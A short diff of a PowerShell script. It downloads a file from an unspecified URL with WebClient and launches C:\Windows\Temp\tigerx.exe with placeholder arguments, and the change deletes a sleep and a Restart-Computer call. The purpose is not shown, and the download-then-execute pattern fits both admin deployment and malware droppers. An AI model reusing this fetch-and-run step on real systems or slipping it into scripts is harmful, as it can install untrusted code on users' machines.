@@ -41,7 +41,3 @@ $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $outpath)
 $args = @("Comma","Separated","Arguments")
 Start-Process -Filepath "C:\Windows\Temp\tigerx.exe" -ArgumentList $args
-
-Start-Sleep -Seconds 35
-
-Restart-Computer
